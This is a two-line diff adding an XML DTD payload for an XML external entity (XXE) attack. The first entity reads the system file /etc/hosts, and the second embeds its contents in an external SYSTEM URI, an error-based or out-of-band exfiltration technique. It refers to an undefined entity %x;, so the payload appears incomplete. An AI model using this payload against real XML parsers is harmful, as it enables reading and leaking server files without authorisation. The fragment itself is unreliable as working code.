@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///etc/hosts"> 
+<!ENTITY % error "<!ENTITY content SYSTEM '%x;/%file;'>">
